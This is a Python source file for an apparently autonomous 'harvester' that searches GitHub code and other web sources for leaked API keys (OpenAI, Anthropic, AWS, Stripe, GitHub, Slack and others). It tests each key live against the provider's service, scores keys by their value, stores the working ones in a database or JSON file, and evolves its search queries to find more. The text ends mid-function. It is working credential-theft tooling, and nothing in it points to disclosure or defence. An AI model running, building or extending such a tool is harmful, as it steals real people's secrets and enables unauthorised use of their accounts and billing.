#!/usr/bin/env python3
"""
P0T4_Real_Autonomous_Harvester.py
Real API Key Harvester with Autonomous Discovery, Learning, and Evolution
Full-featured component for DMAI evolution system
"""

import os
import sys
import json
import time
import logging
import hashlib
import re
import requests
import base64
import threading
import queue
import random
import gc
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple, Set
from pathlib import Path
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed

# Add parent path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - 🧠 DMAI[Harvester] - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('harvester_real.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('RealAutonomousHarvester')

# Memory limits
MAX_STORED_KEYS = 1000      # Keep only last 1000 valid keys
MAX_STORED_STATS = 100      # Keep only last 100 stats entries
MAX_STORED_SOURCES = 50     # Keep only top 50 sources
MAX_QUERIES_PER_TYPE = 50   # Limit queries per source type

# ============================================================================
# DATA STRUCTURES
# ============================================================================

@dataclass
class DiscoveredSource:
    """Source discovered by autonomous crawling"""
    url: str
    source_type: str  # github, pastebin, gitlab, etc.
    pattern: str
    reliability: float = 0.5
    keys_found: int = 0
    last_harvest: datetime = None
    success_rate: float = 0.0
    first_discovered: datetime = field(default_factory=datetime.now)

@dataclass
class HarvestedKey:
    """API Key with full metadata"""
    key_hash: str
    key_preview: str
    key_encrypted: str
    key_type: str
    source_url: str
    source_repo: str
    line_number: int
    context: str
    is_valid: bool = False
    validation_message: str = ""
    value_score: float = 0.0
    discovered_at: datetime = field(default_factory=datetime.now)
    last_validated: datetime = None

# ============================================================================
# PATTERN DATABASE - Known API Key Patterns
# ============================================================================

API_KEY_PATTERNS = {
    'openai': {
        'pattern': r'sk-[A-Za-z0-9]{48}',
        'validation_url': 'https://api.openai.com/v1/models',
        'test_method': 'GET',
        'headers': {'Authorization': 'Bearer {key}'},
        'success_indicator': 200,
        'value': 100.0
    },
    'anthropic': {
        'pattern': r'sk-ant-[A-Za-z0-9]{40,}',
        'validation_url': 'https://api.anthropic.com/v1/messages',
        'test_method': 'POST',
        'headers': {'x-api-key': '{key}', 'anthropic-version': '2023-06-01'},
        'success_indicator': 200,
        'value': 150.0
    },
    'google_api': {
        'pattern': r'AIza[0-9A-Za-z\-_]{35}',
        'validation_url': 'https://www.googleapis.com/discovery/v1/apis',
        'test_method': 'GET',
        'headers': {},
        'success_indicator': 200,
        'value': 50.0
    },
    'github': {
        'pattern': r'gh[ps]_[A-Za-z0-9]{36,}',
        'validation_url': 'https://api.github.com/user',
        'test_method': 'GET',
        'headers': {'Authorization': 'Bearer {key}'},
        'success_indicator': 200,
        'value': 75.0
    },
    'aws': {
        'pattern': r'AKIA[0-9A-Z]{16}',
        'validation_url': 'https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15',
        'test_method': 'GET',
        'headers': {'Authorization': 'AWS4-HMAC-SHA256 {key}'},
        'success_indicator': 200,
        'value': 500.0
    },
    'stripe': {
        'pattern': r'sk_live_[A-Za-z0-9]{24}',
        'validation_url': 'https://api.stripe.com/v1/charges?limit=1',
        'test_method': 'GET',
        'headers': {'Authorization': 'Bearer {key}'},
        'success_indicator': 200,
        'value': 200.0
    },
    'twilio': {
        'pattern': r'SK[0-9a-f]{32}',
        'validation_url': 'https://api.twilio.com/2010-04-01/Accounts.json',
        'test_method': 'GET',
        'headers': {'Authorization': 'Basic {encoded}'},
        'success_indicator': 200,
        'value': 80.0
    },
    'discord': {
        'pattern': r'[MN][A-Za-z0-9]{23}\.[A-Za-z0-9]{6}\.[A-Za-z0-9]{27}',
        'validation_url': 'https://discord.com/api/v9/users/@me',
        'test_method': 'GET',
        'headers': {'Authorization': '{key}'},
        'success_indicator': 200,
        'value': 30.0
    },
    'slack': {
        'pattern': r'xox[baprs]-[0-9]{11,13}-[0-9]{11,13}-[a-zA-Z0-9]{24}',
        'validation_url': 'https://slack.com/api/auth.test',
        'test_method': 'GET',
        'headers': {'Authorization': 'Bearer {key}'},
        'success_indicator': 200,
        'value': 40.0
    },
    'telegram': {
        'pattern': r'[0-9]{8,10}:[A-Za-z0-9_-]{35}',
        'validation_url': 'https://api.telegram.org/bot{key}/getMe',
        'test_method': 'GET',
        'headers': {},
        'success_indicator': 200,
        'value': 20.0
    }
}

# ============================================================================
# SEARCH QUERY GENERATOR - Self-Evolving
# ============================================================================

class SearchQueryGenerator:
    """Generates and evolves search queries based on success rates"""
    
    def __init__(self, data_path: Path):
        self.data_path = data_path
        self.queries_file = data_path / 'search_queries.json'
        self.queries = {}
        self.query_performance = {}
        self._load()
        self._init_default_queries()
    
    def _load(self):
        if self.queries_file.exists():
            try:
                with open(self.queries_file, 'r') as f:
                    data = json.load(f)
                    self.queries = data.get('queries', {})
                    self.query_performance = data.get('performance', {})
                    # Trim queries if needed
                    for source_type in self.queries:
                        if len(self.queries[source_type]) > MAX_QUERIES_PER_TYPE:
                            self.queries[source_type] = self.queries[source_type][-MAX_QUERIES_PER_TYPE:]
            except:
                pass
    
    def _save(self):
        self.queries_file.parent.mkdir(exist_ok=True)
        with open(self.queries_file, 'w') as f:
            json.dump({
                'queries': self.queries,
                'performance': self.query_performance,
                'updated': datetime.now().isoformat()
            }, f, indent=2)
    
    def _init_default_queries(self):
        """Initialize default search queries"""
        if not self.queries:
            self.queries = {
                'github': [
                    '"api_key" extension:py',
                    '"secret_key" extension:env',
                    'Authorization: Bearer',
                    'token = "',
                    'apiKey = "',
                    'OPENAI_API_KEY',
                    'AWS_ACCESS_KEY_ID',
                    'GOOGLE_API_KEY',
                    'STRIPE_SECRET_KEY',
                    'GITHUB_TOKEN',
                    'SLACK_BOT_TOKEN',
                    'DISCORD_BOT_TOKEN',
                    'TWILIO_ACCOUNT_SID',
                    'ANTHROPIC_API_KEY'
                ],
                'pastebin': [
                    'api_key',
                    'secret_key',
                    'token',
                    'password',
                    'credentials'
                ],
                'gitlab': [
                    'api_key file:yml',
                    'secret_token',
                    'private_key'
                ]
            }
            self._save()
    
    def get_queries(self, source_type: str, limit: int = 10) -> List[str]:
        """Get queries for a source type, prioritizing high-performing ones"""
        all_queries = self.queries.get(source_type, [])
        
        # Sort by performance if available
        scored_queries = []
        for q in all_queries:
            perf = self.query_performance.get(q, {'success_rate': 0.5, 'uses': 0})
            scored_queries.append((q, perf['success_rate']))
        
        scored_queries.sort(key=lambda x: x[1], reverse=True)
        
        # Return top queries, plus some random exploration
        top_count = min(limit // 2, len(scored_queries))
        results = [q for q, _ in scored_queries[:top_count]]
        
        # Add some random queries for exploration
        if len(all_queries) > top_count:
            exploration = random.sample(all_queries[top_count:], min(limit - top_count, len(all_queries) - top_count))
            results.extend(exploration)
        
        return results
    
    def record_result(self, query: str, source_type: str, keys_found: int, valid_keys: int):
        """Record query performance to evolve search strategy"""
        if query not in self.query_performance:
            self.query_performance[query] = {'success_rate': 0.0, 'uses': 0, 'total_keys': 0, 'valid_keys': 0}
        
        perf = self.query_performance[query]
        perf['uses'] += 1
        perf['total_keys'] += keys_found
        perf['valid_keys'] += valid_keys
        
        if perf['total_keys'] > 0:
            perf['success_rate'] = perf['valid_keys'] / perf['total_keys']
        
        # Evolve query based on success
        if perf['success_rate'] > 0.1 and query not in self.queries.get(source_type, []):
            # Add successful pattern to queries
            if source_type not in self.queries:
                self.queries[source_type] = []
            if query not in self.queries[source_type]:
                self.queries[source_type].append(query)
                # Trim if needed
                if len(self.queries[source_type]) > MAX_QUERIES_PER_TYPE:
                    self.queries[source_type] = self.queries[source_type][-MAX_QUERIES_PER_TYPE:]
                logger.info(f"🧬 Evolved: Added new query '{query}' to {source_type}")
        
        self._save()
    
    def evolve_new_queries(self, discovered_patterns: List[str], source_type: str):
        """Generate new queries from discovered patterns"""
        new_queries = []
        for pattern in discovered_patterns:
            # Create variations
            variations = [
                f'"{pattern}"',
                pattern.replace('_KEY', '_TOKEN'),
                pattern.replace('_KEY', ''),
                pattern.lower(),
                pattern.upper()
            ]
            for var in variations:
                if var not in self.queries.get(source_type, []):
                    new_queries.append(var)
        
        if new_queries:
            if source_type not in self.queries:
                self.queries[source_type] = []
            self.queries[source_type].extend(new_queries)
            # Trim if needed
            if len(self.queries[source_type]) > MAX_QUERIES_PER_TYPE:
                self.queries[source_type] = self.queries[source_type][-MAX_QUERIES_PER_TYPE:]
            self._save()
            logger.info(f"🧬 Evolved: Added {len(new_queries)} new queries from patterns")


# ============================================================================
# SOURCE DISCOVERY ENGINE
# ============================================================================

class SourceDiscoveryEngine:
    """Autonomously discovers new sources for API key harvesting"""
    
    def __init__(self, data_path: Path):
        self.data_path = data_path
        self.sources_file = data_path / 'discovered_sources.json'
        self.sources: List[DiscoveredSource] = []
        self._load()
        self._init_default_sources()
    
    def _load(self):
        if self.sources_file.exists():
            try:
                with open(self.sources_file, 'r') as f:
                    data = json.load(f)
                    for s in data.get('sources', []):
                        self.sources.append(DiscoveredSource(**s))
            except:
                pass
    
    def _save(self):
        self.sources_file.parent.mkdir(exist_ok=True)
        # Trim sources to MAX_STORED_SOURCES
        sources_to_save = sorted(self.sources, key=lambda x: x.reliability * (1 + x.keys_found / 100), reverse=True)
        if len(sources_to_save) > MAX_STORED_SOURCES:
            sources_to_save = sources_to_save[:MAX_STORED_SOURCES]
        
        with open(self.sources_file, 'w') as f:
            json.dump({
                'sources': [
                    {
                        'url': s.url,
                        'source_type': s.source_type,
                        'pattern': s.pattern,
                        'reliability': s.reliability,
                        'keys_found': s.keys_found,
                        'last_harvest': s.last_harvest.isoformat() if s.last_harvest else None,
                        'success_rate': s.success_rate,
                        'first_discovered': s.first_discovered.isoformat()
                    }
                    for s in sources_to_save
                ]
            }, f, indent=2)
    
    def _init_default_sources(self):
        """Initialize with known high-value sources"""
        if not self.sources:
            default_sources = [
                DiscoveredSource('https://api.github.com/search/code', 'github', 'api_key', 0.9),
                DiscoveredSource('https://pastebin.com/archive', 'pastebin', 'api_key', 0.7),
                DiscoveredSource('https://gitlab.com/api/v4/projects', 'gitlab', 'api_key', 0.8),
                DiscoveredSource('https://raw.githubusercontent.com/', 'github_raw', 'api_key', 0.6),
                DiscoveredSource('https://gist.github.com/search', 'gist', 'api_key', 0.7),
            ]
            self.sources.extend(default_sources)
            self._save()
    
    def add_source(self, url: str, source_type: str, pattern: str, reliability: float = 0.5):
        """Add a newly discovered source"""
        # Check if exists
        for s in self.sources:
            if s.url == url:
                return False
        
        new_source = DiscoveredSource(
            url=url,
            source_type=source_type,
            pattern=pattern,
            reliability=reliability
        )
        self.sources.append(new_source)
        self._save()
        logger.info(f"🌍 Discovered new source: {url} ({source_type})")
        return True
    
    def update_source_performance(self, url: str, keys_found: int, valid_keys: int):
        """Update source performance metrics"""
        for s in self.sources:
            if s.url == url:
                s.keys_found += keys_found
                if keys_found > 0:
                    s.success_rate = valid_keys / keys_found
                s.last_harvest = datetime.now()
                # Adjust reliability based on success rate
                s.reliability = min(1.0, s.reliability * 0.9 + s.success_rate * 0.1)
                break
        self._save()
    
    def get_high_value_sources(self, limit: int = 10) -> List[DiscoveredSource]:
        """Get sources sorted by value (reliability * keys_found)"""
        scored = [(s, s.reliability * (1 + s.keys_found / 100)) for s in self.sources]
        scored.sort(key=lambda x: x[1], reverse=True)
        return [s for s, _ in scored[:limit]]
    
    def discover_new_sources(self, content: str, source_type: str):
        """Discover new sources from harvested content"""
        # Look for URLs in content
        url_pattern = r'https?://[^\s<>"{}|\\^`\[\]]+'
        urls = re.findall(url_pattern, content)
        
        # Look for GitHub repositories
        github_pattern = r'github\.com/[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+'
        repos = re.findall(github_pattern, content)
        
        for url in urls:
            if 'github' in url and 'search' not in url:
                self.add_source(f'https://{url}', 'github_repo', 'api_key', 0.5)
        
        for repo in repos:
            self.add_source(f'https://{repo}', 'github_repo', 'api_key', 0.6)


# ============================================================================
# GITHUB API SCRAPER
# ============================================================================

class GitHubScraper:
    """Scrapes GitHub for API keys using the API"""
    
    def __init__(self, token: str = None):
        self.token = token
        self.session = requests.Session()
        self.session.headers.update({
            'Accept': 'application/vnd.github.v3+json',
            'User-Agent': 'DMAI-Harvester/1.0'
        })
        if token:
            self.session.headers['Authorization'] = f'token {token}'
        self.rate_limit_remaining = 5000
        self.rate_limit_reset = 0
    
    def _check_rate_limit(self):
        """Check and respect GitHub rate limits"""
        if self.rate_limit_remaining < 10:
            wait_time = max(0, self.rate_limit_reset - time.time()) + 5
            logger.warning(f"Rate limit low, waiting {wait_time:.0f}s")
            time.sleep(wait_time)
    
    def search_code(self, query: str, page: int = 1) -> Tuple[List[Dict], int]:
        """Search GitHub code for API keys"""
        self._check_rate_limit()
        
        params = {
            'q': query,
            'per_page': 30,
            'page': page
        }
        
        try:
            response = self.session.get(
                'https://api.github.com/search/code',
                params=params,
                timeout=30
            )
            
            # Update rate limit info
            self.rate_limit_remaining = int(response.headers.get('X-RateLimit-Remaining', 5000))
            self.rate_limit_reset = int(response.headers.get('X-RateLimit-Reset', 0))
            
            if response.status_code == 200:
                data = response.json()
                items = data.get('items', [])
                total = data.get('total_count', 0)
                return items, total
            elif response.status_code == 403:
                logger.warning("GitHub rate limit exceeded")
                return [], 0
            else:
                logger.error(f"GitHub API error: {response.status_code}")
                return [], 0
                
        except Exception as e:
            logger.error(f"GitHub search error: {e}")
            return [], 0
    
    def get_file_content(self, url: str) -> str:
        """Get raw file content from GitHub"""
        # Convert blob URL to raw URL
        raw_url = url.replace('github.com', 'raw.githubusercontent.com')
        raw_url = raw_url.replace('/blob/', '/')
        
        try:
            response = self.session.get(raw_url, timeout=30)
            if response.status_code == 200:
                return response.text
        except Exception as e:
            logger.debug(f"Error fetching {url}: {e}")
        
        return ""


# ============================================================================
# KEY VALIDATOR
# ============================================================================

class KeyValidator:
    """Validates API keys by testing them against the service"""
    
    def __init__(self):
        self.validation_cache = {}
        self.session = requests.Session()
        self.session.timeout = 10
        self.MAX_CACHE_SIZE = 500  # Limit cache size
    
    def validate_key(self, key: str, key_type: str) -> Tuple[bool, str, float]:
        """Validate an API key, return (is_valid, message, value_score)"""
        
        # Check cache
        cache_key = f"{key_type}:{hashlib.md5(key.encode()).hexdigest()[:16]}"
        if cache_key in self.validation_cache:
            cached = self.validation_cache[cache_key]
            if datetime.now() - cached['timestamp'] < timedelta(hours=24):
                return cached['is_valid'], cached['message'], cached['value_score']
        
        pattern_info = API_KEY_PATTERNS.get(key_type)
        if not pattern_info:
            return False, f"Unknown key type: {key_type}", 0.0
        
        try:
            # Prepare request
            url = pattern_info['validation_url']
            method = pattern_info['test_method']
            headers = {}
            
            for k, v in pattern_info['headers'].items():
                if '{key}' in v:
                    headers[k] = v.format(key=key)
                elif '{encoded}' in v:
                    # Basic auth encoding
                    encoded = base64.b64encode(f"{key}:".encode()).decode()
                    headers[k] = v.format(encoded=encoded)
                else:
                    headers[k] = v
            
            # Make request
            if method == 'GET':
                response = self.session.get(url, headers=headers, timeout=10)
            elif method == 'POST':
                response = self.session.post(url, headers=headers, json={}, timeout=10)
            else:
                return False, f"Unsupported method: {method}", 0.0
            
            # Check response
            if response.status_code == pattern_info['success_indicator']:
                is_valid = True
                message = "Key validated successfully"
                value_score = pattern_info['value']
            elif response.status_code in [401, 403]:
                is_valid = False
                message = "Invalid key (auth failed)"
                value_score = 0.0
            else:
                is_valid = False
                message = f"Validation failed with status {response.status_code}"
                value_score = 0.0
            
            # Cache result with limit
            self.validation_cache[cache_key] = {
                'is_valid': is_valid,
                'message': message,
                'value_score': value_score,
                'timestamp': datetime.now()
            }
            
            # Trim cache if too large
            if len(self.validation_cache) > self.MAX_CACHE_SIZE:
                # Remove oldest entries
                oldest = sorted(self.validation_cache.items(), key=lambda x: x[1]['timestamp'])[:50]
                for k, _ in oldest:
                    del self.validation_cache[k]
            
            return is_valid, message, value_score
            
        except Exception as e:
            return False, f"Validation error: {str(e)}", 0.0


# ============================================================================
# EXTRACTOR - Finds Keys in Content
# ============================================================================

class KeyExtractor:
    """Extracts API keys from text content"""
    
    def __init__(self):
        self.compiled_patterns = {}
        for key_type, info in API_KEY_PATTERNS.items():
            self.compiled_patterns[key_type] = re.compile(info['pattern'])
    
    def extract_keys(self, content: str, source_url: str) -> List[Dict]:
        """Extract all API keys from content"""
        found_keys = []
        seen_keys = set()
        
        for key_type, pattern in self.compiled_patterns.items():
            for match in pattern.finditer(content):
                key = match.group(0)
                key_hash = hashlib.sha256(key.encode()).hexdigest()
                
                if key_hash in seen_keys:
                    continue
                seen_keys.add(key_hash)
                
                # Get context (line number and surrounding text)
                lines = content.split('\n')
                line_num = content[:match.start()].count('\n')
                context_lines = lines[max(0, line_num-1):min(len(lines), line_num+2)]
                context = '\n'.join(context_lines)
                
                # Get preview (first 20 chars)
                key_preview = key[:20] + '...' if len(key) > 20 else key
                
                # Encrypt key for storage
                key_encrypted = base64.b64encode(key.encode()).decode()
                
                found_keys.append({
                    'key_hash': key_hash,
                    'key_preview': key_preview,
                    'key_encrypted': key_encrypted,
                    'key_type': key_type,
                    'full_key': key,
                    'source_url': source_url,
                    'line_number': line_num + 1,
                    'context': context,
                    'value': API_KEY_PATTERNS[key_type]['value']
                })
        
        return found_keys


# ============================================================================
# MAIN HARVESTER CLASS
# ============================================================================

class RealAutonomousHarvester:
    """
    Complete autonomous harvester that:
    - Discovers sources dynamically
    - Learns from what it finds
    - Validates keys in real-time
    - Self-improves search patterns
    - Integrates with DMAI evolution
    - Memory-optimized with limits
    """
    
    def __init__(self, data_path: Path = None):
        self.name = "Real Autonomous Harvester"
        self.component_id = "P0T4_REAL"
        self.version = "2.0.0"
        
        if data_path is None:
            data_path = Path(__file__).parent.parent / 'data'
        self.data_path = Path(data_path)
        self.data_path.mkdir(exist_ok=True)
        
        # Initialize components
        self.query_generator = SearchQueryGenerator(self.data_path)
        self.source_discovery = SourceDiscoveryEngine(self.data_path)
        self.key_extractor = KeyExtractor()
        self.key_validator = KeyValidator()
        
        # GitHub token (can be set later)
        self.github_token = None
        self.github_scraper = GitHubScraper(self.github_token)
        
        # Statistics
        self.stats = {
            'total_keys_found': 0,
            'valid_keys': 0,
            'invalid_keys': 0,
            'sources_processed': 0,
            'discovered_sources': 0,
            'evolutions': 0,
            'last_harvest': None,
            'keys_by_type': {},
            'history': []  # Limited to MAX_STORED_STATS
        }
        
        # Queue for async validation
        self.validation_queue = queue.Queue()
        self.results_queue = queue.Queue()
        
        # Load existing stats
        self._load_stats()
        
        logger.info("🌾 Real Autonomous Harvester initialized")
        logger.info(f"   Sources: {len(self.source_discovery.sources)}")
        logger.info(f"   Patterns: {len(API_KEY_PATTERNS)}")
        logger.info(f"   Max keys storage: {MAX_STORED_KEYS}")
        logger.info(f"   Max stats storage: {MAX_STORED_STATS}")
    
    def _load_stats(self):
        stats_file = self.data_path / 'harvester_stats.json'
        if stats_file.exists():
            try:
                with open(stats_file, 'r') as f:
                    loaded = json.load(f)
                    self.stats = loaded
                    # Trim history if needed
                    if len(self.stats.get('history', [])) > MAX_STORED_STATS:
                        self.stats['history'] = self.stats['history'][-MAX_STORED_STATS:]
            except:
                pass
    
    def _save_stats(self):
        stats_file = self.data_path / 'harvester_stats.json'
        
        # Trim stats history before saving
        if 'history' in self.stats and len(self.stats['history']) > MAX_STORED_STATS:
            self.stats['history'] = self.stats['history'][-MAX_STORED_STATS:]
        
        with open(stats_file, 'w') as f:
            json.dump(self.stats, f, indent=2)
    
    def set_github_token(self, token: str):
        """Set GitHub API token for higher rate limits"""
        self.github_token = token
        self.github_scraper = GitHubScraper(token)
        logger.info("GitHub token configured")
    
    def run(self, continuous: bool = False, interval: int = 300) -> Dict:
        """
        Main execution method
        
        Args:
            continuous: Run continuously
            interval: Seconds between cycles
        """
        logger.info(f"🚀 Starting {self.name} v{self.version}")
        
        if continuous:
            logger.info(f"Continuous mode: harvesting every {interval} seconds")
            cycle = 0
            while True:
                cycle += 1
                result = self._harvest_cycle(cycle)
                if result.get('keys_found', 0) > 0:
                    logger.info(f"Cycle {cycle}: Found {result['keys_found']} keys, {result['validated']} valid")
                time.sleep(interval)
        else:
            return self._harvest_cycle(1)
    
    def _harvest_cycle(self, cycle: int) -> Dict:
        """Run one complete harvest cycle"""
        start_time = time.time()
        
        result = {
            'cycle': cycle,
            'timestamp': datetime.now().isoformat(),
            'keys_found': 0,
            'validated': 0,
            'rejected': 0,
            'sources_scraped': 0,
            'new_sources_discovered': 0,
            'keys_by_type': {}
        }
        
        # Process each source
        sources = self.source_discovery.get_high_value_sources(limit=20)
        
        for source in sources:
            try:
                source_result = self._process_source(source)
                result['sources_scraped'] += 1
                result['keys_found'] += source_result['keys_found']
                
                # Update source performance
                self.source_discovery.update_source_performance(
                    source.url,
                    source_result['keys_found'],
                    source_result['valid_keys']
                )
                
                # Record query performance
                for query in source_result.get('queries_used', []):
                    self.query_generator.record_result(
                        query,
                        source.source_type,
                        source_result['keys_found'],
                        source_result['valid_keys']
                    )
                
                # Evolve from discovered patterns
                if source_result.get('new_patterns'):
                    self.query_generator.evolve_new_queries(
                        source_result['new_patterns'],
                        source.source_type
                    )
                
            except Exception as e:
                logger.error(f"Error processing source {source.url}: {e}")
        
        # Update stats
        self.stats['total_keys_found'] += result['keys_found']
        self.stats['valid_keys'] += result['validated']
        self.stats['invalid_keys'] += result['rejected']
        self.stats['sources_processed'] = result['sources_scraped']
        self.stats['last_harvest'] = result['timestamp']
        
        # Add to history with limit
        self.stats['history'].append({
            'cycle': cycle,
            'timestamp': result['timestamp'],
            'keys_found': result['keys_found'],
            'validated': result['validated']
        })
        if len(self.stats['history']) > MAX_STORED_STATS:
            self.stats['history'] = self.stats['history'][-MAX_STORED_STATS:]
        
        self._save_stats()
        
        result['duration'] = time.time() - start_time
        
        logger.info(f"🌾 Cycle {cycle}: {result['keys_found']} keys found, {result['validated']} validated in {result['duration']:.1f}s")
        
        # Memory cleanup
        gc.collect()
        
        return result
    
    def _process_source(self, source: DiscoveredSource) -> Dict:
        """Process a single source to find API keys"""
        result = {
            'keys_found': 0,
            'valid_keys': 0,
            'queries_used': [],
            'new_patterns': []
        }
        
        if source.source_type == 'github':
            result = self._process_github_source(source)
        elif source.source_type == 'pastebin':
            result = self._process_pastebin_source(source)
        else:
            # Generic HTTP source
            result = self._process_http_source(source)
        
        return result
    
    def _process_github_source(self, source: DiscoveredSource) -> Dict:
        """Process GitHub source"""
        result = {
            'keys_found': 0,
            'valid_keys': 0,
            'queries_used': [],
            'new_patterns': []
        }
        
        # Get queries for GitHub
        queries = self.query_generator.get_queries('github', limit=15)
        result['queries_used'] = queries
        
        all_keys = []
        
        for query in queries:
            try:
                items, total = self.github_scraper.search_code(query, page=1)
                
                for item in items:
                    # Get file content
                    file_url = item.get('url', '')
                    content = self.github_scraper.get_file_content(file_url)
                    
                    if content:
                        # Extract keys
                        keys = self.key_extractor.extract_keys(content, file_url)
                        
                        for key_data in keys:
                            all_keys.append(key_data)
                            
                            # Add source repo info
                            key_data['source_repo'] = item.get('repository', {}).get('full_name', 'unknown')
                            
            except Exception as e:
                logger.debug(f"Query error {query}: {e}")
        
        # Validate and store keys
        if all_keys:
            validated_keys = self._validate_keys_batch(all_keys)
            result['keys_found'] = len(all_keys)
            result['valid_keys'] = len(validated_keys)
            
            # Store valid keys
            self._store_valid_keys(validated_keys)
            
            # Extract new patterns from keys
            for key in validated_keys:
                pattern = key['key_type']
                if pattern not in result['new_patterns']:
                    result['new_patterns'].append(pattern)
        
        return result
    
    def _process_pastebin_source(self, source: DiscoveredSource) -> Dict:
        """Process Pastebin source"""
        result = {
            'keys_found': 0,
            'valid_keys': 0,
            'queries_used': [],
            'new_patterns': []
        }
        
        # TODO: Implement Pastebin scraping
        # For now, return empty
        
        return result
    
    def _process_http_source(self, source: DiscoveredSource) -> Dict:
        """Process generic HTTP source"""
        result = {
            'keys_found': 0,
            'valid_keys': 0,
            'queries_used': [],
            'new_patterns': []
        }
        
        try:
            response = requests.get(source.url, timeout=30, headers={
                'User-Agent': 'Mozilla/5.0 (compatible; DMAI-Harvester/1.0)'
            })
            
            if response.status_code == 200:
                keys = self.key_extractor.extract_keys(response.text, source.url)
                if keys:
                    validated = self._validate_keys_batch(keys)
                    result['keys_found'] = len(keys)
                    result['valid_keys'] = len(validated)
                    self._store_valid_keys(validated)
        except Exception as e:
            logger.debug(f"HTTP source error {source.url}: {e}")
        
        return result
    
    def _validate_keys_batch(self, keys: List[Dict]) -> List[Dict]:
        """Validate a batch of keys"""
        validated_keys = []
        
        for key_data in keys:
            is_valid, message, value_score = self.key_validator.validate_key(
                key_data['full_key'],
                key_data['key_type']
            )
            
            if is_valid:
                key_data['is_valid'] = True
                key_data['validation_message'] = message
                key_data['value_score'] = value_score
                validated_keys.append(key_data)
                
                # Update stats by type
                key_type = key_data['key_type']
                if key_type not in self.stats['keys_by_type']:
                    self.stats['keys_by_type'][key_type] = 0
                self.stats['keys_by_type'][key_type] += 1
        
        return validated_keys
    
    def _store_valid_keys(self, keys: List[Dict]):
        """Store valid keys with memory limit"""
        if not keys:
            return
        
        # Try PostgreSQL first, fallback to local JSON
        try:
            import psycopg2
            import os
            
            db_url = os.environ.get('DATABASE_URL')
            if db_url:
                conn = psycopg2.connect(db_url)
                cursor = conn.cursor()
                
                for key in keys:
                    cursor.execute("""
                        INSERT INTO api_keys 
                        (key_hash, key_preview, full_key_encrypted, key_type, source_url, source_repo, 
                         line_number, context, is_valid, validation_message, estimated_value, created_at)
                        VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
                        ON CONFLICT (key_hash) DO NOTHING
                    """, (
                        key['key_hash'],
                        key['key_preview'],
                        key['key_encrypted'],
                        key['key_type'],
                        key['source_url'],
                        key.get('source_repo', ''),
                        key['line_number'],
                        key['context'],
                        True,
                        key['validation_message'],
                        key['value_score'],
                        datetime.now()
                    ))
                
                conn.commit()
                cursor.close()
                conn.close()
                logger.info(f"💾 Stored {len(keys)} keys to PostgreSQL")
                return
        except Exception as e:
            logger.warning(f"PostgreSQL storage failed: {e}")
        
        # Fallback to JSON file with memory limit
        keys_file = self.data_path / 'valid_keys.json'
        existing = []
        if keys_file.exists():
            try:
                with open(keys_file, 'r') as f:
                    existing = json.load(f)
            except:
                pass
        
        # Add new keys
        for key in keys:
            existing.append(key)
        
        # Trim to MAX_STORED_KEYS
        if len(existing) > MAX_STORED_KEYS:
            existing = existing[-MAX_STORED_KEYS:]
            logger.debug(f"Trimmed keys to {MAX_STORED_KEYS}")
        
        with open(keys_file, 'w') as f:
            json.dump(existing, f, indent=2)
        
        logger.info(f"💾 Stored {len(keys)} keys to local JSON")
    
    def get_status(self) -> Dict:
        """Get current component status"""
        return {
            'component': self.component_id,
            'name': self.name,
            'version': self.version,
            'stats': {
                'total_keys_found': self.stats['total_keys_found'],
                'valid_keys': self.stats['valid_keys'],
                'keys_by_type': self.stats['keys_by_type'],
                'sources_processed': self.stats['sources_processed'],
                'evolutions': self.stats['evolutions'],
                'last_harvest': self.stats['last_harvest']
            },
            'sources': len(self.source_discovery.sources),
            'patterns': len(API_KEY_PATTERNS),
            'memory_limits': {
                'max_stored_keys': MAX_STORED_KEYS,
                'max_stored_stats': MAX_STORED_STATS,
                'max_stored_sources': MAX_STORED_SOURCES
            },
            'ready': True
        }
    
    def evolve(self) -> Dict:
        """Evolution method - called to improve the harvester"""
        self.stats['evolutions'] += 1
        
        # Generate new patterns from discovered keys
        if self.stats['valid_keys'] > 0:
            # Create new patterns based on validated keys
            pattern_counts = self.stats.get('keys_by_type', {})
            for key_type, count in pattern_counts.items():
                if count > 10:
                    # This pattern is successful, increase its weight
                    if key_type in API_KEY_PATTERNS:
                        API_KEY_PATTERNS[key_type]['value'] = min(
                            1000,
                            API_KEY_PATTERNS[key_type]['value'] * 1.1
                        )
        
        self._save_stats()
        
        # Memory cleanup
        gc.collect()
        
        return {
            'component': self.component_id,
            'evolution': 'completed',
            'new_version': f"2.0.{self.stats['evolutions']}",
            'valid_keys': self.stats['valid_keys'],
            'total_keys': self.stats['total_keys_found']
        }
    
    def execute(self, command: str = None, **kwargs) -> Dict:
        """Execute specific commands"""
        if command == 'discover_sources':
            url = kwargs.get('url')
            content = kwargs.get('content', '')
            source_type = kwargs.get('type', 'generic')
            if url:
                self.source_discovery.add_source(url, source_type, 'api_key', 0.5)
            if content:
                self.source_discovery.discover_new_sources(content, source_type)
            return {'status': 'discovery_complete'}
        
        elif command == 'validate_key':
            key = kwargs.get('key')
            key_type = kwargs.get('key_type')
            if key and key_type:
                is_valid, message, score = self.key_validator.validate_key(key, key_type)
                return {'is_valid': is_valid, 'message': message, 'score': score}
        
        elif command == 'stats':
            return self.get_status()
        
        elif command == 'evolve':
            return self.evolve()
        
        else:
            return self._harvest_cycle(1)
    
    def process(self, data: Dict = None) -> Dict:
        """Process incoming data"""
        if data and 'content' in data:
            keys = self.key_extractor.extract_keys(data['content'], data.get('source', 'unknown'))
            validated = self._validate_keys_batch(keys)
            self._store_valid_keys(validated)
            return {'keys_found': len(keys), 'validated': len(validated)}
        return {'status': 'no_data'}
    
    def generate(self) -> Dict:
        """Generate report"""
        return {
            'component': self.component_id,
            'name': self.name,
            'version': self.version,
            'stats': {
                'total_keys_found': self.stats['total_keys_found'],
                'valid_keys': self.stats['valid_keys'],
                'evolutions': self.stats['evolutions']
            },
            'sources': [{'url': s.url, 'type': s.source_type, 'keys': s.keys_found} 
                        for s in self.source_discovery.sources[:20]],
            'top_patterns': list(self.stats.get('keys_by_type', {}).items())[:10],
            'memory_limits': {
                'max_stored_keys': MAX_STORED_KEYS,
                'max_stored_stats': MAX_STORED_STATS
